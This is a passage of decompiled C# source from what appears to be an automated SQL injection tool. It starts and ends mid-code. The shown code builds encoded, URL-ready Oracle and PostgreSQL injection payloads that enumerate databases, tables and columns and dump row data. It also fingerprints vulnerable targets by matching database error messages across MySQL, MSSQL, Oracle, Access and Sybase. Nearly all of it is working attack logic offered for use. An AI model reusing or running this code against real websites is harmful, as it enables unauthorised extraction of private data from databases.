		{
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select column_name from (select rownum r, column_name from all_tab_columns where owner = " + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name = " + global::Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where r = "), checked(iIndex + 1)), ")"));
			text = "(%K%||#||%K%)".Replace("#", text);
			text = Oracle.GetQuery(oMethod, (OracleErrorType)bError).Replace("#", text);
			text = text.Replace("%K%", newValue);
			text = global::Globals.G_Utilities.EncodeURL(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}

		public static string Dump(string sTraject, InjectionType oMethod, MySQLErrorType bError, string sDataBase, string sTable, List<string> lColumn, bool bCastAsChar, OracleTopN oTopN, int iIndex, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string text = "";
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			string text2 = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text3 = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			checked
			{
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					string text4 = "";
					if (lColumn.Count == 1)
					{
						text4 = "(#) as t".Replace("#", lColumn[0].Trim());
					}
					else
					{
						int arg_AA_0 = 0;
						int num = lColumn.Count - 1;
						for (int i = arg_AA_0; i <= num; i++)
						{
							if (i > 0)
							{
								text4 = text4 + "||" + text2 + "||";
							}
							text4 += lColumn[i].Trim();
						}
						text4 = "(#) as t".Replace("#", text4);
					}
					switch (oTopN)
					{
					case OracleTopN.ROWNUM:
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text3.Replace("#", "t") + " " + "from (" + "select rownum r, " + text4 + " " + "from %DB%.%TB%", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where r = "), iIndex + 1), ")"));
						break;
					case OracleTopN.RANK:
					case OracleTopN.DENSE_RANK:
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text3.Replace("#", "t") + " " + "from (" + "select " + text4 + ", ", Interaction.IIf(oTopN == OracleTopN.RANK, "rank()", "dense_rank()")), " over (order by "), lColumn[0]), " desc) sal_rank "), "from %DB%.%TB%"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where sal_rank = "), iIndex + 1), ")"));
						break;
					}
					text = text.Replace("%DB%", sDataBase);
					text = text.Replace("%TB%", sTable);
				}
				else
				{
					text = "(" + sCustomQuery + ")";
					text = text.Replace("[x]", Conversions.ToString(iIndex + 1));
					text = text.Replace("[s]", "||" + text2 + "||");
				}
				text = "(%K%||#||%K%)".Replace("#", text);
				text = Oracle.GetQuery(oMethod, (OracleErrorType)bError).Replace("#", text);
				text = text.Replace("%K%", newValue);
				text = global::Globals.G_Utilities.EncodeURL(text);
				return sTraject.Replace("[t]", text) + sEndUrl;
			}
		}

		public static string Count(string sTraject, InjectionType oMethod, OracleErrorType bError, bool bCastAsChar, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string text = "";
			string text2 = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			string newValue = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			switch (o)
			{
			case Schema.DATABASES:
				text = "(select " + text2.Replace("#", "count(*)") + "from (select distinct owner from all_tables))";
				break;
			case Schema.TABLES:
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text2.Replace("#", "count(*)") + "from all_tables " + "where owner = " + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"));
				break;
			case Schema.COLUMNS:
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text2.Replace("#", "count(*)") + "from all_tab_columns " + "where owner = " + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name = " + global::Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"));
				break;
			case Schema.ROWS:
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text2.Replace("#", "count(*)") + "from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), ")"));
				break;
			}
			text = "(%K%||#||%K%)".Replace("#", text);
			text = Oracle.GetQuery(oMethod, bError).Replace("#", text);
			text = text.Replace("%K%", newValue);
			text = global::Globals.G_Utilities.EncodeURL(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}
	}

	public enum OracleErrorType : byte
	{
		NONE,
		GET_HOST_ADDRESS,
		DRITHSX_SN,
		GETMAPPINGXPATH
	}

	public enum OracleTopN
	{
		ROWNUM,
		RANK,
		DENSE_RANK
	}

	public class PostgreSQL
	{
		private const string BASE_TABLE = "chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37)";

		private const string CAST_TEXT = "cast(# as text)";

		private const string CAST_ERROR_ = "cast((#) as int)";

		public static string Info(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, List<string> lColumn, string sEndUrl = "")
		{
			string text = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			string str = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text2 = text + "||#||" + text;
			switch (bError)
			{
			case PostgreSQLErrorType.NONE:
				text2 = "(" + text2 + ")";
				break;
			case PostgreSQLErrorType.CAST_INT:
				text2 = "cast((#) as int)".Replace("#", text2);
				break;
			}
			checked
			{
				string text3;
				if (lColumn.Count == 1)
				{
					text3 = lColumn[0].Trim();
				}
				else
				{
					text3 = "";
					int arg_AC_0 = 0;
					int num = lColumn.Count - 1;
					for (int i = arg_AC_0; i <= num; i++)
					{
						if (i > 0)
						{
							text3 = text3 + "||" + str + "||";
						}
						text3 += lColumn[i].Trim();
					}
					text3 = text3;
				}
				text2 = text2.Replace("#", text3);
				text2 = global::Globals.G_Utilities.EncodeURL(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		public static string DataBases(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, bool bCorrentDB, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text2 = text + "||#||" + text;
			switch (bError)
			{
			case PostgreSQLErrorType.NONE:
				text2 = "(" + text2 + ")";
				break;
			case PostgreSQLErrorType.CAST_INT:
				text2 = "cast((#) as int)".Replace("#", text2);
				break;
			}
			if (bCorrentDB)
			{
				text2 = text2.Replace("#", "(select current_database())");
			}
			else
			{
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct datname from pg_database where datname not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%postgres%", false, "||", "chr") + " and datname not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%template%", false, "||", "chr"), Interaction.IIf(!string.IsNullOrEmpty(sWhere), " and " + sWhere + " ", " ")), Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), "order by " + sOrderBy + ", [datname] asc ", " ")), "limit 1 offset "), iOFFSET), ")")));
			}
			text2 = global::Globals.G_Utilities.EncodeURL(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		public static string Tables(string sTraject, InjectionType oMethod, string sDataBase, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text2 = text + "||#||" + text;
			switch (bError)
			{
			case PostgreSQLErrorType.NONE:
				text2 = "(" + text2 + ")";
				break;
			case PostgreSQLErrorType.CAST_INT:
				text2 = "cast((#) as int)".Replace("#", text2);
				break;
			}
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct table_name from information_schema.tables where table_catalog=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_type like " + "chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37)" + " and table_name not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%pg_%", false, "||", "chr") + " and table_name not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%sql_%", false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), " limit 1 offset "), iOFFSET), ")")));
			text2 = global::Globals.G_Utilities.EncodeURL(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		public static string Columns(string sTraject, InjectionType oMethod, string sDataBase, string sTable, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string text = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text2 = text + "||#||" + text;
			switch (bError)
			{
			case PostgreSQLErrorType.NONE:
				text2 = "(" + text2 + ")";
				break;
			case PostgreSQLErrorType.CAST_INT:
				text2 = "cast((#) as int)".Replace("#", text2);
				break;
			}
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct column_name from information_schema.columns where table_catalog=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), " limit 1 offset "), iOFFSET), ")")));
			text2 = global::Globals.G_Utilities.EncodeURL(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}

		public static string Dump(string sTraject, InjectionType oMethod, string sDataBase, string sTable, List<string> lColumn, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string text = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			string text2 = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text3 = text + "||#||" + text;
			switch (bError)
			{
			case PostgreSQLErrorType.NONE:
				text3 = "(" + text3 + ")";
				break;
			case PostgreSQLErrorType.CAST_INT:
				text3 = "cast((#) as int)".Replace("#", text3);
				break;
			}
			checked
			{
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					string text4;
					if (lColumn.Count == 1)
					{
						text4 = "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[0].Trim()));
					}
					else
					{
						text4 = "";
						int arg_DC_0 = 0;
						int num = lColumn.Count - 1;
						for (int i = arg_DC_0; i <= num; i++)
						{
							if (i > 0)
							{
								text4 = text4 + "||" + text2 + "||";
							}
							text4 += "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[i].Trim()));
						}
						text4 = text4;
					}
					text3 = text3.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text4 + " from " + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " order by " + sOrderBy)), " limit 1 offset "), iOFFSET), ")")));
				}
				else
				{
					text3 = text3.Replace("#", sCustomQuery);
					if (text3.Contains("[s]"))
					{
						text3 = text3.Replace("[s]", "||" + text2 + "||");
					}
					text3 = text3.Replace("[x]", Conversions.ToString(iOFFSET));
				}
				text3 = global::Globals.G_Utilities.EncodeURL(text3);
				return sTraject.Replace("[t]", text3) + sEndUrl;
			}
		}

		public static string Count(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string text = global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.DATA_SPLIT_STR, false, "||", "chr");
			global::Globals.G_Utilities.ConvertTextToSQLChar(global::Globals.COLLUMNS_SPLIT_STR, false, "||", "chr");
			string text2 = text + "||#||" + text;
			switch (bError)
			{
			case PostgreSQLErrorType.NONE:
				text2 = "(" + text2 + ")";
				break;
			case PostgreSQLErrorType.CAST_INT:
				text2 = "cast((#) as int)".Replace("#", text2);
				break;
			}
			switch (o)
			{
			case Schema.DATABASES:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from pg_database where datname not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%postgres%", false, "||", "chr") + " and datname not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%template%", false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			case Schema.TABLES:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from information_schema.tables where table_catalog=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_type like " + "chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37)" + " and table_name not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%pg_%", false, "||", "chr") + " and table_name not like " + global::Globals.G_Utilities.ConvertTextToSQLChar("%sql_%", false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			case Schema.COLUMNS:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from information_schema.columns where table_catalog=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sDataBase, false, "||", "chr") + " and table_name=" + global::Globals.G_Utilities.ConvertTextToSQLChar(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			case Schema.ROWS:
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from " + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
				break;
			}
			text2 = global::Globals.G_Utilities.EncodeURL(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}
	}

	public enum PostgreSQLCollactions : byte
	{
		None,
		SubStr,
		StrPos,
		Get_Byte
	}

	public enum PostgreSQLErrorType : byte
	{
		NONE,
		CAST_INT
	}

	public enum Schema
	{
		INFO,
		DATABASES,
		TABLES,
		COLUMNS,
		ROWS
	}

	public enum Types
	{
		None,
		Unknown,
		MySQL_Unknown,
		MySQL_No_Error,
		MySQL_With_Error,
		MSSQL_Unknown,
		MSSQL_No_Error,
		MSSQL_With_Error,
		Oracle_Unknown,
		Oracle_No_Error,
		Oracle_With_Error,
		PostgreSQL_Unknown,
		PostgreSQL_No_Error,
		PostgreSQL_With_Error,
		MsAccess,
		Sybase
	}

	[StandardModule]
	internal sealed class Utls
	{
		public const int NULL_CHAR = 32;

		public const bool EXCLUDE_SYSTEM_SCHEMA = true;

        public static Types CheckSyntaxError(string sSource)
        {
            sSource = sSource.ToLower();
            bool flag = true;
            if (((((true == (sSource.IndexOf("mysql_num_rows()".ToLower()) >= 0)) || (flag == (sSource.IndexOf("mysql_fetch_array()".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("mysql_result()".ToLower()) >= 0)) || (flag == (sSource.IndexOf("mysql_query()".ToLower()) >= 0)))) || (((flag == (sSource.IndexOf("mysql_fetch_assoc()".ToLower()) >= 0)) || (flag == (sSource.IndexOf("mysql_numrows()".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("mysql_fetch_row()".ToLower()) >= 0)) || (flag == (sSource.IndexOf("mysql_fetch_object()".ToLower()) >= 0))))) || ((((flag == (sSource.IndexOf("JDBC MySQL()".ToLower()) >= 0)) || (flag == (sSource.IndexOf("MySQL Driver".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("MySQL Error".ToLower()) >= 0)) || (flag == (sSource.IndexOf("MySQL ODBC".ToLower()) >= 0)))) || (((flag == (sSource.IndexOf("on MySQL result index".ToLower()) >= 0)) || (flag == (sSource.IndexOf("supplied argument is not a valid MySQL result resource".ToLower()) >= 0))) || (flag == (sSource.IndexOf("MySQL server version for the right syntax to use near".ToLower()) >= 0)))))
            {
                return Types.MySQL_Unknown;
            }
            if (((((flag == (sSource.IndexOf("Microsoft OLE DB Provider for ODBC Drivers error".ToLower()) >= 0)) || (flag == (sSource.IndexOf("[Microsoft][ODBC SQL Server Driver][SQL Server]".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("ODBC Drivers error '80040e14'".ToLower()) >= 0)) || (flag == (sSource.IndexOf("ODBC SQL Server Driver".ToLower()) >= 0)))) || (((flag == (sSource.IndexOf("JDBC SQL".ToLower()) >= 0)) || (flag == (sSource.IndexOf("Microsoft OLE DB Provider for SQL Server".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("Unclosed quotation mark".ToLower()) >= 0)) || (flag == (sSource.IndexOf("VBScript Runtime".ToLower()) >= 0))))) || (flag == (sSource.IndexOf("SQLServer JDBC Driver".ToLower()) >= 0)))
            {
                return Types.MSSQL_Unknown;
            }
            if ((((flag == (sSource.IndexOf("ORA-0".ToLower()) >= 0)) || (flag == (sSource.IndexOf("ORA-1".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("Oracle DB2".ToLower()) >= 0)) || (flag == (sSource.IndexOf("Oracle Driver".ToLower()) >= 0)))) || (((flag == (sSource.IndexOf("Oracle Error".ToLower()) >= 0)) || (flag == (sSource.IndexOf("Oracle ODBC".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("MM_XSLTransform error".ToLower()) >= 0)) || (flag == (sSource.IndexOf("[Macromedia][Oracle JDBC Driver][Oracle]ORA-".ToLower()) >= 0)))))
            {
                return Types.Oracle_Unknown;
            }
            if (((flag == ((sSource.IndexOf("[Microsoft][ODBC Microsoft Access Driver]".ToLower()) >= 0) & (sSource.IndexOf("WHERE".ToLower()) <= 0))) || (flag == ((sSource.IndexOf("ODBC Microsoft Access Driver".ToLower()) >= 0) & (sSource.IndexOf("WHERE".ToLower()) <= 0)))) || (flag == (sSource.IndexOf("Microsoft JET Database Engine error '80040e14'".ToLower()) >= 0)))
            {
                return Types.MsAccess;
            }
            if (((((flag == (sSource.IndexOf("Warning: pg_exec() ".ToLower()) >= 0)) || (flag == (sSource.IndexOf("function.pg-exec".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("target_user:target_db:PostgreSQL".ToLower()) >= 0)) || (flag == (sSource.IndexOf("PostgreSQL query failed".ToLower()) >= 0)))) || (((flag == (sSource.IndexOf("Supplied argument is not a valid PostgreSQL result".ToLower()) >= 0)) || (flag == (sSource.IndexOf("pg_fetch_array()".ToLower()) >= 0))) || ((flag == (sSource.IndexOf("pg_query()".ToLower()) >= 0)) || (flag == (sSource.IndexOf("pg_fetch_assoc()".ToLower()) >= 0))))) || (flag == (sSource.IndexOf("function.pg-query".ToLower()) >= 0)))
            {
                return Types.PostgreSQL_Unknown;
            }
            if ((flag == (sSource.IndexOf("com.sybase.jdbc2.jdbc.SybSQLException".ToLower()) >= 0)) || (flag == (sSource.IndexOf("SybSQLException".ToLower()) >= 0)))
            {
                return Types.Sybase;
            }
            if (((((flag != (sSource.IndexOf("Error Executing Database Query".ToLower()) >= 0)) && (flag != (sSource.IndexOf("ADODB.Command".ToLower()) >= 0))) && ((flag != (sSource.IndexOf("BOF or EOF".ToLower()) >= 0)) && (flag != (sSource.IndexOf("ADODB.Field".ToLower()) >= 0)))) && (((flag != (sSource.IndexOf("sql error".ToLower()) >= 0)) && (flag != (sSource.IndexOf("syntax error".ToLower()) >= 0))) && ((flag != (sSource.IndexOf("OLE DB Provider for ODBC".ToLower()) >= 0)) && (flag != (sSource.IndexOf("ADODBCommand".ToLower()) >= 0))))) && ((((flag != (sSource.IndexOf("ADODBField".ToLower()) >= 0)) && (flag != (sSource.IndexOf("A syntax error has occurred".ToLower()) >= 0))) && ((flag != (sSource.IndexOf("Custom Error Message".ToLower()) >= 0)) && (flag != (sSource.IndexOf("Incorrect syntax near".ToLower()) >= 0)))) && ((((flag != (sSource.IndexOf("Error Report".ToLower()) >= 0)) && (flag != (sSource.IndexOf("Error converting data type varchar to numeric".ToLower()) >= 0))) && ((flag != (sSource.IndexOf("Incorrect syntax near".ToLower()) >= 0)) && (flag != (sSource.IndexOf("SQL command not properly ended".ToLower()) >= 0)))) && (((flag != (sSource.IndexOf("Types mismatch".ToLower()) >= 0)) && (flag != (sSource.IndexOf("invalid query".ToLower()) >= 0))) && ((((flag != (sSource.IndexOf("unexpected end of SQL command".ToLower()) >= 0)) && (flag != (sSource.IndexOf("Unclosed quotation mark before the character string".ToLower()) >= 0))) && ((flag != (sSource.IndexOf("Unterminated string constant".ToLower()) >= 0)) && (flag != (sSource.IndexOf("SQLException".ToLower()) >= 0)))) && (flag != (sSource.IndexOf("DBObject::doQuery".ToLower()) >= 0)))))))
            {
                return Types.None;
            }
            return Types.Unknown;
        }
		public static string GetMySQLCollaction(MySQLCollactions c)
		{
			string result = "";
			switch (c)
			{
			case MySQLCollactions.None:
				result = "#";
				break;
			case MySQLCollactions.UnHex:
				result = "unhex(hex(#))";
				break;
			case MySQLCollactions.Binary:
				result = "binary(#)";
				break;
			case MySQLCollactions.CastAsChar:
				result = "cast(# as char)";
				break;
			case MySQLCollactions.Compress:
				result = "uncompress(compress(#))";
				break;
			case MySQLCollactions.ConvertUtf8:
				result = "convert(# using utf8)";
				break;
			case MySQLCollactions.ConvertLatin1:
				result = "convert(# using latin1)";
				break;
			case MySQLCollactions.Aes_descrypt:
				result = "aes_decrypt(aes_encrypt(#,1),1)";
				break;
			}
			return result;
		}

		public static string TypeToString(Types o)
		{
			switch (o)
			{
			case Types.MySQL_Unknown:
				return "MySQL";
			case Types.MySQL_No_Error:
				return "MySQL Union";
			case Types.MySQL_With_Error:
				return "MySQL Error";
			case Types.MSSQL_Unknown:
				return "MS SQL";
			case Types.MSSQL_No_Error:
				return "MS SQL Union";
			case Types.MSSQL_With_Error:
				return "MS SQL Error";
			case Types.Oracle_Unknown:
				return "Oracle";
			case Types.Oracle_No_Error:
				return "Oracle Union";
			case Types.Oracle_With_Error:
				return "Oracle Error";
			case Types.PostgreSQL_Unknown:
				return "PostgreSQL";
			case Types.PostgreSQL_No_Error:
				return "PostgreSQL Union";
			case Types.PostgreSQL_With_Error:
				return "PostgreSQL Error";
			case Types.MsAccess:
				return "MS Access";
			case Types.Sybase:
				return "Sybase";
			default:
				return "Unknown";
			}
		}

		public static Types StringToType(string s)
		{
			if (Operators.CompareString(s, "MySQL Unknown", false) != 0)
			{
				if (Operators.CompareString(s, "MySQL", false) != 0)
				{
					if (Operators.CompareString(s, "MySQL Union", false) == 0)
					{
						return Types.MySQL_No_Error;
					}
					if (Operators.CompareString(s, "MySQL Error", false) == 0)
					{
						return Types.MySQL_With_Error;
					}
					if (Operators.CompareString(s, "MS SQL Unknown", false) != 0)
					{
						if (Operators.CompareString(s, "MS SQL", false) != 0)
						{
							if (Operators.CompareString(s, "MS SQL Union", false) == 0)
							{
								return Types.MSSQL_No_Error;
							}
							if (Operators.CompareString(s, "MS SQL Error", false) == 0)
							{
								return Types.MSSQL_With_Error;
							}
							if (Operators.CompareString(s, "Oracle Unknown", false) != 0)
							{
								if (Operators.CompareString(s, "Oracle", false) != 0)
								{
									if (Operators.CompareString(s, "Oracle Union", false) == 0)
									{
										return Types.Oracle_No_Error;
									}
									if (Operators.CompareString(s, "Oracle Error", false) == 0)
									{
										return Types.Oracle_With_Error;
									}
									if (Operators.CompareString(s, "PostgreSQL Unknown", false) != 0)
									{
										if (Operators.CompareString(s, "PostgreSQL", false) != 0)
										{
											if (Operators.CompareString(s, "PostgreSQL Union", false) == 0)
											{
												return Types.PostgreSQL_No_Error;
											}
											if (Operators.CompareString(s, "PostgreSQL Error", false) == 0)
											{
												return Types.PostgreSQL_With_Error;
											}
											if (Operators.CompareString(s, "MS Access", false) == 0)
											{
												return Types.MsAccess;
											}
											if (Operators.CompareString(s, "Sybase", false) == 0)
											{
												return Types.Sybase;
											}
											return Types.Unknown;
										}
									}
									return Types.PostgreSQL_Unknown;
								}
							}
							return Types.Oracle_Unknown;
						}
					}
					return Types.MSSQL_Unknown;
				}
			}
			return Types.MySQL_Unknown;
		}

		public static string BuilListMySQL(List<string> o, bool bUnhexHex = false, bool bCastAsChar = false, bool bHexEncoded = false, bool bConvertUtf8 = false)
		{
			Conversions.ToString(Interaction.IIf(bConvertUtf8, "convert(# using utf8)", "#"));
			string newValue = Conversions.ToString(Interaction.IIf(bUnhexHex, "unhex(hex(#))", "#"));
			string newValue2 = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(#)", "#"));
			string newValue3 = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char)", "#"));
			StringBuilder stringBuilder = new StringBuilder();
			int arg_6C_0 = 0;
			checked
			{
				int num = o.Count - 1;
				for (int i = arg_6C_0; i <= num; i++)
				{
					string text = o[i].Replace("#", Conversions.ToString(bConvertUtf8));
					text = text.Replace("#", newValue2);
					text = text.Replace("#", newValue);
					text = text.Replace("#", newValue3);
					int num2 = i;
					if (num2 == 0)
					{
						stringBuilder.Append(text);
					}
					else if (num2 == o.Count - 1)
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.Append("," + text);
					}
				}
				return stringBuilder.ToString();
			}
		}

		public static string BuilListForWhereIn(List<string> o, bool bHex, bool bSQLChar = false, bool bGroupChar = true)
		{
			StringBuilder stringBuilder = new StringBuilder();
			int arg_11_0 = 0;
			checked
			{
				int num = o.Count - 1;
				for (int i = arg_11_0; i <= num; i++)
				{
					string text;
					if (bHex)
					{
						text = global::Globals.G_Utilities.ConvertTextToHex(o[i]);
					}
					else
					{
						text = global::Globals.G_Utilities.ConvertTextToSQLChar(o[i], bGroupChar, "+", "char");
					}
					int num2 = i;
					if (num2 == 0)
					{
						stringBuilder.Append(text);
					}
					else if (num2 == o.Count - 1)
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.Append("," + text);
					}
				}
				return stringBuilder.ToString();
			}
		}

		public static bool TypeIsMySQL(Types t)
		{
			return t == Types.MySQL_No_Error | t == Types.MySQL_With_Error | t == Types.MySQL_Unknown;
		}

		public static bool TypeIsMSSQL(Types t)
		{
			return t == Types.MSSQL_No_Error | t == Types.MSSQL_With_Error | t == Types.MSSQL_Unknown;
		}

		public static bool TypeIsOracle(Types t)
		{
			return t == Types.Oracle_No_Error | t == Types.Oracle_With_Error | t == Types.Oracle_Unknown;
		}

		public static bool TypeIsPostgreSQL(Types t)
		{
			return t == Types.PostgreSQL_No_Error | t == Types.PostgreSQL_With_Error | t == Types.PostgreSQL_Unknown;
		}

		public static bool TypeIsError(Types t)
		{
			return t == Types.MySQL_With_Error | t == Types.MSSQL_With_Error | t == Types.Oracle_With_Error | t == Types.PostgreSQL_With_Error;
		}

        public static bool TypeIsInjecatble(Types t)
        {
